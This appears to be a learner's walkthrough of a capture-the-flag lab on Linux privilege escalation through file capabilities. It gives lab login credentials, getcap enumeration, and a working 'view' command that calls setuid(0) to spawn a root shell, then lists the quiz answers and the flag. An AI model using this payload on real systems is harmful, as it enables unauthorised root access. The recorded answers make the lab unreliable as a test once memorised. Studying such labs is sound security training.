**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
The capabilities man page provides detailed information on its usage and options.  
  
We can use the `getcap` tool to list enabled capabilities.

![](https://i.imgur.com/Q6XYr0p.png)

When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.  
  
Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

![](https://i.imgur.com/6csoabB.png)

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.  
  
We notice that vim can be used with the following command and payload:  
  
![](https://i.imgur.com/nlpCMWj.png)  

This will launch a root shell as seen below;

  

![](https://i.imgur.com/jCjvgo3.png)  

Answer the questions below

Complete the task described above on the target system  

![[Pasted image 20231214225921.png]]


| Question                                 | Answer |
| ---------------------------------------- | ------ |
| How many binaries have set capabilities? | 6      |

| Question                                                | Answer |
| ------------------------------------------------------- | ------ |
| What other binary can be used through its capabilities? | view   |

We have `view` in the screenshot:

![[Pasted image 20231214232444.png]]

Try to escalate privileges for it. Search in https://gtfobins.github.io/#view:

![[Pasted image 20231214232714.png]]

![[Pasted image 20231214232813.png]]

```
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

And we have privilege escalated:

![[Pasted image 20231214233150.png]]

| Question                                   | Answer      |
| ------------------------------------------ | ----------- |
| What is the content of the flag4.txt file? | THM-9349843 |

The flag is in /home/ubuntu

![[Pasted image 20231214233322.png]]
